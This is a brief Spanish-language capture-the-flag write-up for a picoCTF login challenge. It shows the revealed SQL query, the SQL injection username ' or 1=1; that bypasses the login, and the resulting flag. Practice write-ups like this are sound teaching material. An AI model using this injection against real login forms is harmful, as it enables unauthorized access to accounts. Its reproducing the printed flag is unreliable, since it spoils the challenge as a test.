## Objetivo
There is a website running at `https://jupiter.challenges.picoctf.org/problem/39720/` ([link](https://jupiter.challenges.picoctf.org/problem/39720/)) or http://jupiter.challenges.picoctf.org:39720. Do you think you can log us in? Try to see if you can login!
## Solución
```
Colocamos debug en 1 y ahora al intentar logearnos sale:
username: 
password: 
SQL query: SELECT * FROM users WHERE name='' AND password=''
Descubrimos que se puede realizar una injeccion SQL asi que hacemos lo siguiente:
username: ' or 1=1;
password: 
SQL query: SELECT * FROM users WHERE name='' or 1=1;' AND password=''

# Logged in!

Your flag is: picoCTF{s0m3_SQL_c218b685}
```
## Notas adicionales
Cuando el php no tiene seguridad podemos inyectar codigo sql atraves del login o de la consola
## Referencias